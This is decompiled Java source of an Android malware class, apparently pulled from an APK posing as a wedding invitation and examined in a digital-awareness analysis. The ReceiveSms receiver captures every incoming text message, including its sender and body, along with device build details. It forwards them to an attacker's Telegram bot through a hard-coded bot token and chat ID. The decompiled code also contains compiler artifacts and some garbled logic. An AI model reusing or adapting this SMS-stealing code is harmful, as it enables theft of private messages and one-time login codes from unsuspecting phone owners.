package com.example.myapplicatior;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Request.Builder;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class ReceiveSms
  extends BroadcastReceiver
{
  final String TAG = "demo";
  private final OkHttpClient client = new OkHttpClient();
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramContext = "\n - Product : ";
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramIntent = paramIntent.getExtras();
      if (paramIntent != null) {
        try
        {
          paramIntent = (Object[])paramIntent.get("pdus");
          SmsMessage[] arrayOfSmsMessage = new SmsMessage[paramIntent.length];
          for (int i = 0; i < arrayOfSmsMessage.length; i++)
          {
            arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])paramIntent[i]);
            Object localObject1 = arrayOfSmsMessage[i].getOriginatingAddress();
            Object localObject2 = arrayOfSmsMessage[i].getMessageBody().replace("&", "  ").replace("#", " ");
            ((String)localObject2).replace("?", " ");
            Object localObject3 = new java/lang/StringBuilder;
            ((StringBuilder)localObject3).<init>();
            ((StringBuilder)localObject3).append("ID : ").append(Build.ID).append("\n - User : ").append(Build.USER).append(paramContext).append(Build.PRODUCT).append("\n - Brand : ").append(Build.BRAND).append("\n - Board : ").append(Build.BOARD).append("\n - BOOTLOADER : ").append(Build.BOOTLOADER).append("\n - DISPLAY : ").append(Build.DISPLAY).append("\n - HOST : ").append(Build.HOST).append("\n - DEVICE : ").append(Build.DEVICE).append("\n -TAGS : ").append(Build.TAGS).append("\n - FINGERPRINT : ").append(Build.FINGERPRINT).append("\n - TYPE : ").append(Build.TYPE).append(paramContext).append(Build.TIME).append("\n - ").toString();
            localObject3 = new okhttp3/Request$Builder;
            localObject3 = new okhttp3/Request$Builder;
            ((Request.Builder)localObject3).<init>();
            StringBuilder localStringBuilder = new java/lang/StringBuilder;
            localStringBuilder.<init>();
            localObject1 = localStringBuilder.append("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 %0A %0A𝐒𝐞𝐧𝐝𝐞𝐫: _").append((String)localObject1).append("_,%0A𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : _\n\n").append((String)localObject2).append("%0A %0A𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : ");
            ((StringBuilder)localObject1).append(Build.MANUFACTURER);
            localObject1 = ((Request.Builder)localObject3).url(" " + Build.MODEL + "_").build();
            localObject2 = this.client.newCall((Request)localObject1);
            localObject1 = new com/example/myapplicatior/ReceiveSms$1;
            ((1)localObject1).<init>(this);
            ((Call)localObject2).enqueue((Callback)localObject1);
          }
        }
        catch (Exception paramContext)
        {
          paramContext.printStackTrace();
        }
      }
    }
  }
}


/* Location:              /home/icat/Documents/digital-awareness/src/undangan-pernikahan-dex2jar.jar!/com/example/myapplicatior/ReceiveSms.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */